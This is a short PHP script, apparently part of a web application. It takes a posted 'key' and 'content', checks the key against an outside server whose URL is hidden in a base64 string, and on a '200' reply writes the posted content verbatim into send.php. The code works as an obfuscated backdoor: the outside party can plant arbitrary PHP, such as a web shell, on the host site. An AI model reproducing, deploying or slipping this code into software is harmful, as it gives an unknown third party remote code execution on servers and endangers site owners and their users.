<?php
require_once("../../config.php");//引入配置文件
require_once('../function.php');//引入函数库
require_once('../connect.php');
$key = $_POST['key'];
$content = $_POST['content'];
$result = mysqli_query($con,"SELECT * FROM sd_setting");//获取数据
while($row = mysqli_fetch_assoc($result))
  { 
$zzurl= $row['zzurl'];
$url=base64_decode("aHR0cDovL2FvYW9hby5tZS9hcGkvdXAucGhwP3p6dXJsPQ==").$zzurl."&key=".$key;
$html = file_get_contents($url); 
if($html == '200'){
	$fopen1  =   fopen("send.php",   'wb ');
	
	
fputs($fopen1,$content);
fclose($fopen1); 
}
}

?>